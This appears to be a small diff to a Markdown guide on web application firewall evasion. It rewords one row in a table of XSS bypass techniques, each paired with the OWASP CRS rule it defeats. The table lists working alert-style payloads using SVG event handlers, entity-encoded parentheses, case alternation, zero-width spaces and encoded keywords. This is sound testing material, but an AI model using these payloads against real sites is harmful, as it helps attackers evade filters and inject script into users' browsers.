@@ -120,7 +120,7 @@ Different WAFs fall to different tricks. A small sample:
 | **Slash separator** | `<svg/onload=alert(1) class=x>` | CRS 941160 |
 | **SVG animate** | `<svg><animate onbegin=alert(1) attributeName=x>` | CRS 941110 |
 | **HTML entity parens** | `alert&#40;1&#41;` | CRS 941370 |
-| **Exotic whitespace** | form-feed / vertical tab | CRS 941320 |
+| **Exotic whitespace** | form feed (U+000C) | CRS 941320 |
 | **Case alternation** | `<ScRiPt>` | Case-sensitive rules |
 | **zwsp insertion** (encoder) | U+200B after `<` `>` `"` `'` `(` `)` `/` `;` | Lexer-based detection |
 | **Keyword entity encode** | `onerror=&#97;lert(1)` | `alert`/handler keyword regex (attribute-decoded) |
